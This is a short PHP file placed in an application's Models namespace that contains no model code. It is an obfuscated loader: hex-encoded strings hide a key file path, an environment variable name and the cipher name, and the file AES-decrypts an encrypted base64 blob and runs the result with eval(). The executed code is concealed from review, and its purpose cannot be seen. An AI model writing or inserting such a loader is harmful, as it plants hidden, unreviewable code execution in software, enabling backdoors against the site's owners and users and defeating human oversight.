<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('GdgoYQG3XEu7riCA64EaXg==');

$c=base64_decode(

'eBwuq2cfdaaUvlSQyfkcGaMNb0uts5DjmC0p+gZUxPyZJXBCsi8Z1SAEJDnEvWGk6o4LtCUT6tJH' .
'YJqQsRF8iTGbHnpEYCVjWEAyaiqM0G8E7lxZZSHBvT0nVnb65cyRRjT/WjZdqGBtE2MdeWOgxgS+' .
'tXy+6tFnFQ94XBqWwIOoYN6rdGVXQtIP7SXuc9F29DFLqLwxq2ba8/fQtUmJzv/uLLpqdu79+FNi' .
'n6AxQ7VvuKaMS9WZ+a5YFrgO9xsFhnlDP3bftY/Wvs+U2NKkbi1kHG5IGHCgkD9QTsyf/a6SdrdY' .
'YgQrHbxRxqb6Z7WCTN14YlOiK7fOF6QRLTsrK7HGL3ASVmZofNTNiLhS4Hq7BYp1RnIlQJeEWGqd' .
'1oFALhkOzQnh0ksWUnSQU/NAXI+MRmoQYjJ/T37nS5LnNS7BoJvqi1J7+HR0Uo2xGm+1WQC3kJT5' .
'CfZzHQTstX1JcMXv8NpFoW1a7cEQaHdYDCfyWG884As8BaqywwPGYq6AXHwH94dwReUw1wXtZ//k' .
'9TmFDC3MtqiN+Oaxxgonjy1BU9ag9EvFAgJoqpryHpO5t6b6JtYcKtV5MpeCeyDJX2lbo1Kf0gCL' .
'5N5jxI26cr27W80WhGJqisBFQxjO4bgbkl0l5BsSqGNv69jeikVHyVuR9UcRztmQvKRi7nLkj5Pj' .
'6HjKMEirkT0WBKrzMrNmjCqXyK7aBm0+KXFOlbxqqZpoul7BF8RhoqgbcFYICYDeKUuKVPRG1ebP' .
'+Dn93aWqDnGzXSVutUc/b4t5doxLvsNil430R9bHWLaf/swfquEhRa5WVSFlSK5OnzO7+619gFeU' .
'0K2mZePdH1/aICeqdz2tIepvmZdJznUkzWySOwwnrv1nLsiJQDLKldn+c5NKsD6tRaOU9Xf6O0PQ' .
'Cjj21ot3xbx2R/LLzXMWZPkTfLmG46kkvo993lrgED/mRuKsWD46Kk0D8PqVjFXWj5tbww=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

